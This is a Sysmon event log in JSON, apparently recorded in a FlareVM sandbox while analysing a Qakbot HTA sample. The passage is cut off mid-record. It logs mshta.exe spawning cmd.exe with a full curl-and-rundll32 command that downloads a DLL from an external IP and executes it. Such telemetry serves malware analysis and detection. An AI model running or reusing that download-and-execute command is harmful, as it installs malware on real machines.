{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.205Z","TimeGenerated":"2023-03-02T04:38:21.205Z","EventRecordID":"57642","EventID":7,"Message":"Image loaded:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2023-03-02 16:38:21.192\r\nProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nProcessId: 7376\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\amsi.dll\r\nFileVersion: 10.0.19041.2075 (WinBuild.160101.0800)\r\nDescription: Anti-Malware Scan Interface\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: amsi.dll\r\nHashes: SHA1=9A5D9943B76EFB44BA75F1E7BD5F644C46303A3C,MD5=3AAB15DB5E825A804948A45547F3487D,SHA256=9488F75B4FEB3C7CB39B0DA7EB9B306535F41DE7D613D030848FBAADDAB87CA4,IMPHASH=5D28867D6E8659CB14ADCCE290AB3709\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059.001,technique_name=PowerShell\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.192\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\amsi.dll\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e10.0.19041.2075 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eAnti-Malware Scan Interface\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft® Windows® Operating System\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eamsi.dll\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=9A5D9943B76EFB44BA75F1E7BD5F644C46303A3C,MD5=3AAB15DB5E825A804948A45547F3487D,SHA256=9488F75B4FEB3C7CB39B0DA7EB9B306535F41DE7D613D030848FBAADDAB87CA4,IMPHASH=5D28867D6E8659CB14ADCCE290AB3709\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"technique_id=T1059.001,technique_name=PowerShell","UtcTime":"2023-03-02 16:38:21.192","ProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ProcessId":7376,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\amsi.dll","FileVersion":"10.0.19041.2075 (WinBuild.160101.0800)","Description":"Anti-Malware Scan Interface","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"amsi.dll","Hashes":"SHA1=9A5D9943B76EFB44BA75F1E7BD5F644C46303A3C,MD5=3AAB15DB5E825A804948A45547F3487D,SHA256=9488F75B4FEB3C7CB39B0DA7EB9B306535F41DE7D613D030848FBAADDAB87CA4,IMPHASH=5D28867D6E8659CB14ADCCE290AB3709","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.207Z","TimeGenerated":"2023-03-02T04:38:21.207Z","EventRecordID":"57643","EventID":7,"Message":"Image loaded:\r\nRuleName: technique_id=T1059,technique_name=Command and Scripting Interpreter\r\nUtcTime: 2023-03-02 16:38:21.192\r\nProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nProcessId: 7376\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\wshom.ocx\r\nFileVersion: 5.812.10240.16384\r\nDescription: Windows Script Host Runtime Library\r\nProduct: Microsoft ® Windows Script Host Runtime Library\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wshom.ocx\r\nHashes: SHA1=FB707C000DEC1567B0380C94726CC0178F5C8B9A,MD5=F58923FAAFCB20984857287C32D828EC,SHA256=C4F882C3085FB899E7371C29B574A197AEFA523ABC65AB22CE0A6A9F88E9A305,IMPHASH=B3884085B043196DE8AA4306FCCF874E\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059,technique_name=Command and Scripting Interpreter\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.192\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\wshom.ocx\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e5.812.10240.16384\u003c/Data\u003e\u003cData Name=\"Description\"\u003eWindows Script Host Runtime Library\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft ® Windows Script Host Runtime Library\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003ewshom.ocx\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=FB707C000DEC1567B0380C94726CC0178F5C8B9A,MD5=F58923FAAFCB20984857287C32D828EC,SHA256=C4F882C3085FB899E7371C29B574A197AEFA523ABC65AB22CE0A6A9F88E9A305,IMPHASH=B3884085B043196DE8AA4306FCCF874E\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"technique_id=T1059,technique_name=Command and Scripting Interpreter","UtcTime":"2023-03-02 16:38:21.192","ProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ProcessId":7376,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\wshom.ocx","FileVersion":"5.812.10240.16384","Description":"Windows Script Host Runtime Library","Product":"Microsoft ® Windows Script Host Runtime Library","Company":"Microsoft Corporation","OriginalFileName":"wshom.ocx","Hashes":"SHA1=FB707C000DEC1567B0380C94726CC0178F5C8B9A,MD5=F58923FAAFCB20984857287C32D828EC,SHA256=C4F882C3085FB899E7371C29B574A197AEFA523ABC65AB22CE0A6A9F88E9A305,IMPHASH=B3884085B043196DE8AA4306FCCF874E","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.207Z","TimeGenerated":"2023-03-02T04:38:21.207Z","EventRecordID":"57644","EventID":7,"Message":"Image loaded:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:38:21.192\r\nProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nProcessId: 7376\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nImageLoaded: C:\\Windows\\SysWOW64\\scrrun.dll\r\nFileVersion: 5.812.10240.16384\r\nDescription: Microsoft ® Script Runtime\r\nProduct: Microsoft ® Script Runtime\r\nCompany: Microsoft Corporation\r\nOriginalFileName: scrrun.dll\r\nHashes: SHA1=FA7435E9E001EE73856EFB6AB8BE154FA630D605,MD5=D2B6E78A63A8D55A892CC4A0676243F4,SHA256=7F4C0929062B2705930DF7863597173D51C6B74E716D13A73DA2008FC0CABF1D,IMPHASH=C5D4473BDA6F2BF7AC3F67F462E5225F\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.192\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ImageLoaded\"\u003eC:\\Windows\\SysWOW64\\scrrun.dll\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e5.812.10240.16384\u003c/Data\u003e\u003cData Name=\"Description\"\u003eMicrosoft ® Script Runtime\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft ® Script Runtime\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003escrrun.dll\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=FA7435E9E001EE73856EFB6AB8BE154FA630D605,MD5=D2B6E78A63A8D55A892CC4A0676243F4,SHA256=7F4C0929062B2705930DF7863597173D51C6B74E716D13A73DA2008FC0CABF1D,IMPHASH=C5D4473BDA6F2BF7AC3F67F462E5225F\u003c/Data\u003e\u003cData Name=\"Signed\"\u003etrue\u003c/Data\u003e\u003cData Name=\"Signature\"\u003eMicrosoft Windows\u003c/Data\u003e\u003cData Name=\"SignatureStatus\"\u003eValid\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":7,"RuleName":"-","UtcTime":"2023-03-02 16:38:21.192","ProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ProcessId":7376,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","ImageLoaded":"C:\\Windows\\SysWOW64\\scrrun.dll","FileVersion":"5.812.10240.16384","Description":"Microsoft ® Script Runtime","Product":"Microsoft ® Script Runtime","Company":"Microsoft Corporation","OriginalFileName":"scrrun.dll","Hashes":"SHA1=FA7435E9E001EE73856EFB6AB8BE154FA630D605,MD5=D2B6E78A63A8D55A892CC4A0676243F4,SHA256=7F4C0929062B2705930DF7863597173D51C6B74E716D13A73DA2008FC0CABF1D,IMPHASH=C5D4473BDA6F2BF7AC3F67F462E5225F","Signed":"true","Signature":"Microsoft Windows","SignatureStatus":"Valid","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.259Z","TimeGenerated":"2023-03-02T04:38:21.259Z","EventRecordID":"57645","EventID":13,"Message":"Registry value set:\r\nRuleName: technique_id=T1543,technique_name=Service Creation\r\nEventType: SetValue\r\nUtcTime: 2023-03-02 16:38:21.246\r\nProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nProcessId: 7376\r\nImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\cmd.exe\r\nDetails: Binary Data\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1543,technique_name=Service Creation\u003c/Data\u003e\u003cData Name=\"EventType\"\u003eSetValue\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.246\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"TargetObject\"\u003eHKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"Details\"\u003eBinary Data\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":13,"RuleName":"technique_id=T1543,technique_name=Service Creation","EventType":"SetValue","UtcTime":"2023-03-02 16:38:21.246","ProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ProcessId":7376,"Image":"C:\\Windows\\SysWOW64\\mshta.exe","TargetObject":"HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-2199682790-2533951109-4136935257-1001\\\\Device\\HarddiskVolume3\\Windows\\SysWOW64\\cmd.exe","Details":"Binary Data","User":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.260Z","TimeGenerated":"2023-03-02T04:38:21.260Z","EventRecordID":"57646","EventID":1,"Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-03-02 16:38:21.259\r\nProcessGuid: {159466bb-d0fd-6400-4701-000000000f00}\r\nProcessId: 4628\r\nImage: C:\\Windows\\SysWOW64\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115\r\nCurrentDirectory: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\r\nUser: FLAREVM\\malware\r\nLogonGuid: {159466bb-cd20-6400-d5fd-0d0000000000}\r\nLogonId: 0xDFDD5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=4048488DE6BA4BFEF9EDF103755519F1F762668F,MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A\r\nParentProcessGuid: {159466bb-d0fd-6400-4601-000000000f00}\r\nParentProcessId: 7376\r\nParentImage: C:\\Windows\\SysWOW64\\mshta.exe\r\nParentCommandLine: \"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} \r\nParentUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059,technique_name=Command-Line Interface\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.259\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4701-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e4628\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e10.0.19041.746 (WinBuild.160101.0800)\u003c/Data\u003e\u003cData Name=\"Description\"\u003eWindows Command Processor\u003c/Data\u003e\u003cData Name=\"Product\"\u003eMicrosoft® Windows® Operating System\u003c/Data\u003e\u003cData Name=\"Company\"\u003eMicrosoft Corporation\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003eCmd.Exe\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003e\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026amp;\u0026amp; rundll32 fd.dll,N115\u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{159466bb-cd20-6400-d5fd-0d0000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e0xdfdd5\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e1\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eMedium\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=4048488DE6BA4BFEF9EDF103755519F1F762668F,MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{159466bb-d0fd-6400-4601-000000000f00}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e7376\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003eC:\\Windows\\SysWOW64\\mshta.exe\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} \u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":1,"RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-03-02 16:38:21.259","ProcessGuid":"159466bb-d0fd-6400-4701-000000000f00","ProcessId":4628,"Image":"C:\\Windows\\SysWOW64\\cmd.exe","FileVersion":"10.0.19041.746 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115","CurrentDirectory":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\","User":"FLAREVM\\malware","LogonGuid":"159466bb-cd20-6400-d5fd-0d0000000000","LogonId":"0xdfdd5","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"SHA1=4048488DE6BA4BFEF9EDF103755519F1F762668F,MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A","ParentProcessGuid":"159466bb-d0fd-6400-4601-000000000f00","ParentProcessId":7376,"ParentImage":"C:\\Windows\\SysWOW64\\mshta.exe","ParentCommandLine":"\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ","ParentUser":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.450Z","TimeGenerated":"2023-03-02T04:38:21.450Z","EventRecordID":"57647","EventID":1,"Message":"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2023-03-02 16:38:21.449\r\nProcessGuid: {159466bb-d0fd-6400-4901-000000000f00}\r\nProcessId: 9556\r\nImage: C:\\Windows\\SysWOW64\\curl.exe\r\nFileVersion: 7.83.1\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: curl  -o fd.dll http://64.225.8.202/1Moch7/160223 \r\nCurrentDirectory: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\r\nUser: FLAREVM\\malware\r\nLogonGuid: {159466bb-cd20-6400-d5fd-0d0000000000}\r\nLogonId: 0xDFDD5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=6EDAE73E36B61B261369717EA3657A6783EBA872,MD5=44E5BAEEE864F1E9EDBE3986246AB37A,SHA256=4BCA545DD0DEAC696838C6338BA66A934426A34CE43D136D2750436F31E6BAFB,IMPHASH=FC799C0F8A0C16C28C597E4FC70B806C\r\nParentProcessGuid: {159466bb-d0fd-6400-4701-000000000f00}\r\nParentProcessId: 4628\r\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115\r\nParentUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003etechnique_id=T1059,technique_name=Command-Line Interface\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.449\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4901-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e9556\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\curl.exe\u003c/Data\u003e\u003cData Name=\"FileVersion\"\u003e7.83.1\u003c/Data\u003e\u003cData Name=\"Description\"\u003eThe curl executable\u003c/Data\u003e\u003cData Name=\"Product\"\u003eThe curl executable\u003c/Data\u003e\u003cData Name=\"Company\"\u003ecurl, https://curl.se/\u003c/Data\u003e\u003cData Name=\"OriginalFileName\"\u003ecurl.exe\u003c/Data\u003e\u003cData Name=\"CommandLine\"\u003ecurl  -o fd.dll http://64.225.8.202/1Moch7/160223 \u003c/Data\u003e\u003cData Name=\"CurrentDirectory\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\\u003c/Data\u003e\u003cData Name=\"User\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003cData Name=\"LogonGuid\"\u003e{159466bb-cd20-6400-d5fd-0d0000000000}\u003c/Data\u003e\u003cData Name=\"LogonId\"\u003e0xdfdd5\u003c/Data\u003e\u003cData Name=\"TerminalSessionId\"\u003e1\u003c/Data\u003e\u003cData Name=\"IntegrityLevel\"\u003eMedium\u003c/Data\u003e\u003cData Name=\"Hashes\"\u003eSHA1=6EDAE73E36B61B261369717EA3657A6783EBA872,MD5=44E5BAEEE864F1E9EDBE3986246AB37A,SHA256=4BCA545DD0DEAC696838C6338BA66A934426A34CE43D136D2750436F31E6BAFB,IMPHASH=FC799C0F8A0C16C28C597E4FC70B806C\u003c/Data\u003e\u003cData Name=\"ParentProcessGuid\"\u003e{159466bb-d0fd-6400-4701-000000000f00}\u003c/Data\u003e\u003cData Name=\"ParentProcessId\"\u003e4628\u003c/Data\u003e\u003cData Name=\"ParentImage\"\u003eC:\\Windows\\SysWOW64\\cmd.exe\u003c/Data\u003e\u003cData Name=\"ParentCommandLine\"\u003e\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026amp;\u0026amp; rundll32 fd.dll,N115\u003c/Data\u003e\u003cData Name=\"ParentUser\"\u003eFLAREVM\\malware\u003c/Data\u003e\u003c/EventData\u003e","Task":1,"RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2023-03-02 16:38:21.449","ProcessGuid":"159466bb-d0fd-6400-4901-000000000f00","ProcessId":9556,"Image":"C:\\Windows\\SysWOW64\\curl.exe","FileVersion":"7.83.1","Description":"The curl executable","Product":"The curl executable","Company":"curl, https://curl.se/","OriginalFileName":"curl.exe","CommandLine":"curl  -o fd.dll http://64.225.8.202/1Moch7/160223 ","CurrentDirectory":"C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\","User":"FLAREVM\\malware","LogonGuid":"159466bb-cd20-6400-d5fd-0d0000000000","LogonId":"0xdfdd5","TerminalSessionId":1,"IntegrityLevel":"Medium","Hashes":"SHA1=6EDAE73E36B61B261369717EA3657A6783EBA872,MD5=44E5BAEEE864F1E9EDBE3986246AB37A,SHA256=4BCA545DD0DEAC696838C6338BA66A934426A34CE43D136D2750436F31E6BAFB,IMPHASH=FC799C0F8A0C16C28C597E4FC70B806C","ParentProcessGuid":"159466bb-d0fd-6400-4701-000000000f00","ParentProcessId":4628,"ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\System32\\cmd.exe\" /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 \u0026\u0026 rundll32 fd.dll,N115","ParentUser":"FLAREVM\\malware"},{"EventSourceName":"Microsoft-Windows-Sysmon","Provider":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Level":"4","Keywords":"0x8000000000000000","Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"FlareVM","TimeCreated":"2023-03-02T11:38:21.549Z","TimeGenerated":"2023-03-02T04:38:21.549Z","EventRecordID":"57648","EventID":11,"Message":"File created:\r\nRuleName: -\r\nUtcTime: 2023-03-02 16:38:21.548\r\nProcessGuid: {159466bb-d0fd-6400-4901-000000000f00}\r\nProcessId: 9556\r\nImage: C:\\Windows\\SysWOW64\\curl.exe\r\nTargetFilename: C:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\fd.dll\r\nCreationUtcTime: 2023-03-02 16:38:06.957\r\nUser: FLAREVM\\malware","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\u003cData Name=\"RuleName\"\u003e-\u003c/Data\u003e\u003cData Name=\"UtcTime\"\u003e2023-03-02 16:38:21.548\u003c/Data\u003e\u003cData Name=\"ProcessGuid\"\u003e{159466bb-d0fd-6400-4901-000000000f00}\u003c/Data\u003e\u003cData Name=\"ProcessId\"\u003e9556\u003c/Data\u003e\u003cData Name=\"Image\"\u003eC:\\Windows\\SysWOW64\\curl.exe\u003c/Data\u003e\u003cData Name=\"TargetFilename\"\u003eC:\\Users\\malware\\Desktop\\Malware\\Qakbot\\7427d5bcdd548f6bc47b6f776f1f157e23619be3814d3da7c0f0e234306fb39a\\fd.dll\u003c/Data\u003e\u003cData 